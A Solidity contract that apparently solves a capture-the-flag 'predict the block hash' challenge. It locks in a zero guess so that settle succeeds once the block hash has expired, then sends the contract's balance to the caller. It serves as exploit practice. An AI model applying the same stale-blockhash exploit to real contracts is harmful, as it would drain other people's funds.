// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

abstract contract PredictTheBlockHashChallengeInterface {
    function isComplete() public view virtual returns (bool);
    function lockInGuess(bytes32 hash) public virtual payable;
    function settle() public virtual;
}

contract PredictTheBlockHashChallengeSolver {
    function lockInGuess(PredictTheBlockHashChallengeInterface chal)
        external payable {
        chal.lockInGuess{value: msg.value}(0);
    }

    function settle(PredictTheBlockHashChallengeInterface chal) public {
        chal.settle();
        require(chal.isComplete(), "Keep guesser");

        uint balance = address(this).balance;
        (bool sent, ) = payable(msg.sender).call{value: balance}("");
        require(sent, "Send ether");
    }

    receive() external payable {}
}